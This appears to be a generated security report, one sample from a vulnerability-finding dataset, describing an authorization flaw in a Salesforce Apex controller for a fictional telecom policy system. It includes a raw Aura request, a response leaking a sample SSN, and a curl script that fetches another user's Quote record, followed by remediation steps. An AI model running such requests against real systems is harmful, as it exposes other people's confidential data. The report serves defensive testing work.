# Security Analysis Report
**System:** SpectreNet Policy Control (Salesforce-Integrated)
**Domain:** Telecom / 5G Core / Policy Control
**Example ID:** SF-0065
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields on `QuoteController.getQuoteDetails` — attacker reads any telecom policy Quote record with all sensitive fields |

---

## Finding 1 — BOLA: Mass Assignment via Object Fields on Quote Object (Pattern 1.12)

### Summary
The Apex controller `QuoteController` on SpectreNet Policy Control (`dd65352a.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Quote object. Per §5.0 Pattern 1.12, the client-supplied `fields` array enables mass field assignment — the attacker requests all sensitive fields for Quote `001352A` owned by another user.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.QuoteController.getQuoteDetails`
**Affected endpoint:** `POST https://dd65352a.lightning.force.com/aura`
**Note:** Apex method name and Aura descriptor both use `getQuoteDetails` — consistent within context.txt.

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://dd65352a.lightning.force.com/aura
Authorization: Bearer 00DDD65352A!ARdd65352a...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DDD65352A!ARdd65352a...

message={"actions":[{"id":"1;a","descriptor":"c.QuoteController.getQuoteDetails","callingDescriptor":"UNKNOWN",
"params":{"quoteId":"001352A","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Quote Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001352A", "Name": "Victim Quote Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-67-5160"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DDD65352A!ARdd65352a..."
curl -s -X POST "https://dd65352a.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.QuoteController.getQuoteDetails","callingDescriptor":"UNKNOWN","params":{"quoteId":"001352A","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-67-5160
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class QuoteController { ... }`
2. `WHERE Id = :quoteId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
